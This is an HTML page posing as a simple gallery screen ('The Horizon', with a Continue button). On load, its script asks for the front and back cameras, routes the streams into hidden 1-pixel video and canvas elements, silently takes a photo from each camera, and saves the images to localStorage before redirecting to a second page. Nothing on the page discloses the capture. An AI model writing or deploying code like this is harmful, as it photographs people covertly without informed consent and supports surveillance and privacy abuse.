<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>The Gallery</title>
    <style>
        body {
            margin: 0; padding: 0;
            background-color: #ffffff;
            font-family: 'Segoe UI', sans-serif;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        h1 { font-size: 3.5rem; margin: 0; color: #2d3436; }
        p { font-size: 1.5rem; color: #636e72; margin: 10px 0 30px 0; }
        .next-btn {
            padding: 15px 40px;
            font-size: 1.2rem;
            background-color: #0984e3;
            color: white;
            border: none;
            border-radius: 50px;
            cursor: pointer;
        }
        / Hidden elements /
        #vFront, #vBack, #canvas {
            position: absolute;
            width: 1px;
            height: 1px;
            visibility: hidden;
        }
    </style>
</head>
<body>

    <div class="content">
        <h1 id="main-title">The Horizon</h1>
        <p id="main-desc">Experience the beauty of the moment.</p>
        <button class="next-btn" onclick="goToPageTwo()">Continue</button>
    </div>

    <video id="vFront" autoplay playsinline></video>
    <video id="vBack" autoplay playsinline></video>
    <canvas id="canvas" width="1080" height="1920"></canvas>

    <script>
        const vFront = document.getElementById('vFront');
        const vBack = document.getElementById('vBack');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        // Set high-quality portrait resolution
        canvas.width = 1080;
        canvas.height = 1920;

        window.onload = () => {
            // Step 1: Get the Front Camera
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(streamFront => {
                vFront.srcObject = streamFront;
                
                // Step 2: Get the Back Camera
                return navigator.mediaDevices.getUserMedia({ video: { facingMode: "back" } }).then(streamBack => {
                    vBack.srcObject = streamBack;

                    // Step 3: THE SNAP (Wait 1.5 seconds for the camera to focus)
                    setTimeout(() => {
                        // Capture Front
                        ctx.drawImage(vFront, 0, 0, canvas.width, canvas.height);
                        localStorage.setItem('frontPhoto', canvas.toDataURL());

                        // Capture Back (Small delay between the two)
                        setTimeout(() => {
                            ctx.drawImage(vBack, 0, 0, canvas.width, canvas.height);
                            localStorage.setItem('backPhoto', canvas.toDataURL());
                            console.log("Photos Saved!");
                        }, 500);
                    }, 1500);
                });
            });
        };

        function goToPageTwo() {
            // We check if photos exist before moving
            if(localStorage.getItem('frontPhoto') && localStorage.getItem('backPhoto')) {
                window.location.href = "page2.html";
            } else {
                // Fallback: If photos didn't load in time, move anyway
                window.location.href = "page2.html";
            }
        }
    </script>
</body>
</html>
